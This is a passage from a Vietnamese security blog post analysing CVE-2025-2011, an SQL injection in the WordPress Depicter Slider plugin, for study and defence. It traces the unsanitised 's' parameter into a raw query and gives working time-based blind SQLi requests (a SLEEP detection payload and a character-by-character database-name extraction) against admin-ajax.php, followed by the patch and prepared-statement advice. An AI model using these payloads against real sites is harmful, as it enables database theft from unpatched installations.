</span></span><span class="line"><span class="cl">        <span class="s1">&#39;columns&#39;</span>          <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;columns&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;includeFields&#39;</span>    <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;includeFields&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;skipCustomFields&#39;</span> <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;skipCustomFields&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">leadRepository</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getResults</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">json</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Để biết <code>getResults</code> thực thi query như nào, ta tìm kiếm với từ khóa <code>function getResults</code> hoặc <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> vào <code>getResults</code></p>
<p><figure><a class="lightgallery" href="/2025-09-30-cve-2025-2011/search_3.png" title="search 3" data-thumbnail="/2025-09-30-cve-2025-2011/search_3.png" data-sub-html="<h2>Vị trí định nghĩa hàm getResults trong LeadRepository</h2><p>search 3</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-30-cve-2025-2011/search_3.png"
            data-srcset="/2025-09-30-cve-2025-2011/search_3.png, /2025-09-30-cve-2025-2011/search_3.png 1.5x, /2025-09-30-cve-2025-2011/search_3.png 2x"
            data-sizes="auto"
            alt="/2025-09-30-cve-2025-2011/search_3.png" width="1126" height="326" />
    </a><figcaption class="image-caption">Vị trí định nghĩa hàm getResults trong LeadRepository</figcaption>
    </figure></p>
<p>👉 Khi tìm kiếm, ta thấy kết quả có hai hàm <code>getResults</code>. Dựa vào tên class có thể nhận thấy sự liên quan giữa class <code>LeadRepository</code> và hàm <code>leadRepository()</code>, nhiều khả năng <code>Depicter::leadRepository()</code> sẽ trả về một <strong>instance</strong> của class <strong>LeadRepository</strong>. Bên cạnh đó, ta có thể dựa vào số lượng tham số truyền vào để xác định chính xác hàm <strong>getResults</strong> nào mới là hàm cần phân tích.</p>
<p>Ta thấy điều kiện <code>if</code>,khi không có param <code>includeFields</code> thì <code>getLeadsResults</code> sẽ được gọi, quan sát <code>getLeadsResults</code> trong cùng class:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">getLeadsResults</span><span class="p">(</span> <span class="nv">$args</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Purpose of joining tables is being able to search in leadField values as well
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$leadTable</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lead</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getTable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$leads</span> <span class="o">=</span> <span class="nx">Lead</span><span class="o">::</span><span class="na">new</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.id&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.source_id&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.content_id&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.content_name&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.created_at&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;lf.name as fieldName&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;lf.value as fieldValue&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="o">-&gt;</span><span class="na">join</span><span class="p">(</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leadField</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getTable</span><span class="p">()</span><span class="si">}</span><span class="s2"> AS lf&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.id&#34;</span><span class="p">,</span> <span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34;lf.lead_id&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;s&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$search</span> <span class="o">=</span> <span class="s2">&#34;&#39;%&#34;</span><span class="o">.</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;s&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&#34;%&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$leads</span><span class="o">-&gt;</span><span class="na">appendRawWhere</span><span class="p">(</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span> <span class="s2">&#34;( lf.value like </span><span class="si">{</span><span class="nv">$search</span><span class="si">}</span><span class="s2"> OR </span><span class="si">{</span><span class="nv">$leadTable</span><span class="si">}</span><span class="s2">.content_name like </span><span class="si">{</span><span class="nv">$search</span><span class="si">}</span><span class="s2"> )&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$results</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">paginate</span><span class="p">(</span> <span class="nv">$leads</span><span class="p">,</span> <span class="nv">$args</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Ta thấy param <code>s</code>, nơi được bản vá bảo vệ đã được nối trực tiếp vào câu query bằng hàm <code>appendRawWhere</code>. Khi đó 1 phần query tương ứng sẽ là:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">lf</span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%s_here%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">leadtable</span><span class="p">.</span><span class="n">content_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%s_here%&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>👉 Như vậy khi gửi <strong>GET request</strong> đến <code>/wp-admin/admin-ajax.php</code> với params:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>action=depicter-lead-index&amp;s=payload_here</code></pre></div>
<ul>
<li><code>list</code> được gọi với duy nhất param <code>s</code> được thêm vào <code>$args</code>, còn lại được set giá trị mặc định</li>
<li><code>getResults</code> được gọi với đối số <code>$args</code></li>
<li>Điều kiện <code>if( ! $args['includeFields'] )</code> trong <code>getResults</code> khi <code>includeFields</code> mặc định là <code>false</code> =&gt; <code>getLeadsResults</code> được gọi</li>
<li>Thực hiện truy vấn gây lỗi SQLi</li>
</ul>
<hr>
<h2 id="exploit">Exploit</h2>
<h3 id="detect-sqli">Detect SQLi</h3>
<p>Gửi <strong>GET request</strong> chứa payload SQLi.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=depicter-lead-list&amp;s=999%25&#39;+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here</span></span></span></code></pre></div></div>
<p>Payload được decode:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">999</span><span class="o">%</span><span class="s1">&#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -</span></span></span></code></pre></div></div>
<p>Khi đó một phần của câu query trở thành</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="n">lf</span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;999%&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="n">a</span><span class="p">))</span><span class="w"> </span><span class="c1">-- &#39; OR leadtable.content_name like &#39;999%&#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #&#39;)</span></span></span></code></pre></div></div>
<p><figure><a class="lightgallery" href="/2025-09-30-cve-2025-2011/resp_time.png" title="response time" data-thumbnail="/2025-09-30-cve-2025-2011/resp_time.png" data-sub-html="<h2>Thời gian phản hồi thể hiện payload hoạt động</h2><p>response time</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-30-cve-2025-2011/resp_time.png"
            data-srcset="/2025-09-30-cve-2025-2011/resp_time.png, /2025-09-30-cve-2025-2011/resp_time.png 1.5x, /2025-09-30-cve-2025-2011/resp_time.png 2x"
            data-sizes="auto"
            alt="/2025-09-30-cve-2025-2011/resp_time.png" width="434" height="293" />
    </a><figcaption class="image-caption">Thời gian phản hồi thể hiện payload hoạt động</figcaption>
    </figure></p>
<p>👉 Dựa trên thời gian phản hồi =&gt; payload hoạt động.</p>
<p><strong>Subquery trong mệnh đề FROM</strong>: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.</p>
<h3 id="get-first-letter-of-database-name">Get First Letter of Database Name</h3>
<p>Điều kiện tiên quyết để <strong>dump được hết data</strong> là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.</p>
<p>Gửi request với <strong>SQLi payload</strong>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=depicter-lead-list&amp;s=999%25&#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here</span></span></span></code></pre></div></div>
<p>Sử dụng <code>SUBSTRING()</code> để lấy ký tự đầu tiên của <strong>database name</strong>, <code>IF()</code> trả về <code>SLEEP(5)</code> nếu ký tự đó là <code>0x77</code>(&lsquo;w&rsquo;)</p>
<p>Sử dụng hex encoding <code>w</code> thành <code>0x77</code> vì <code>s</code> được lấy từ <strong>GET</strong> request trong nên bị escape bởi <a href="https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes" target="_blank" rel="noopener noreffer ">magic quotes</a> trong WordPress và bởi <code>sanitize_text_field</code>.</p>
<p>👉 Dựa trên thời gian phản hồi =&gt; kí tự đầu tiên đúng là <code>w</code>.</p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Lỗ hổng <strong>CVE-2025-2011</strong> trong plugin WordPress <strong>Depicter Slider</strong> trước phiên bản <strong>3.6.2</strong>, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.</p>
<p>Bản vá đã <strong>escape SQL</strong> khiến dữ liệu trước khi đưa vào trở thành chuỗi thuần không thể thoát ra khỏi <code>'%...%'</code></p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li>Kiểm soát kỹ input từ người dùng.</li>
<li>Luôn sử dụng <code>$wpdb-&gt;prepare()</code> khi làm việc với database trong WordPress để tránh SQL Injection.</li>
<li>Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.</li>
</ul>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreffer ">SQL Injection cheat sheet - PortSwigger</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability" target="_blank" rel="noopener noreffer "> WordPress Depicter Slider Plugin &lt;= 3.6.1 is vulnerable to SQL Injection </a></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-09-30</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-09-30-cve-2025-2011/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-title="CVE-2025-2011 Analysis &amp; POC" data-hashtags="analyst,plugin,sqli"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-title="CVE-2025-2011 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-title="CVE-2025-2011 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-title="CVE-2025-2011 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-title="CVE-2025-2011 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" data-title="CVE-2025-2011 Analysis &amp; POC" data-description="Security Vulnerability in WordPress Depicter Slider Plugin."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-09-30-cve-2025-2011%2f&amp;text=CVE-2025-2011%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/sqli/">Sqli</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-09-29-cve-2025-48118/" class="prev" rel="prev" title="CVE-2025-48118 Analysis &amp; POC"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-48118 Analysis & POC</a>
            <a href="/vi/2025-10-01-cve-2022-21661/" class="next" rel="next" title="CVE-2022-21661 Analysis &amp; POC">CVE-2022-21661 Analysis & POC<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
